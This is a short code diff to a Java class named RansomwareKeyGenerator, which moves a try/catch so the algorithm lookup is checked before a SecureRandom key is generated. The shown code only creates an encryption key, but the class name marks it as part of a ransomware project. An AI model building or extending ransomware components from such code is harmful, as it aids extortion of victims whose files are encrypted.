@@ -15,6 +15,10 @@ public class RansomwareKeyGenerator {
 
 		try {
 			keyGen = KeyGenerator.getInstance(chosenAlgorithm);
+		} catch (NoSuchAlgorithmException e) {
+
+			throw new AlgorithmNotFoundException();
+		}
 			// Creating a SecureRandom object
 			SecureRandom secRandom = new SecureRandom();
 
@@ -24,10 +28,7 @@ public class RansomwareKeyGenerator {
 			// Generating a key
 			return keyGen.generateKey();
 
-		} catch (NoSuchAlgorithmException e) {
-
-			throw new AlgorithmNotFoundException();
-		}
+	
 
 	}
 
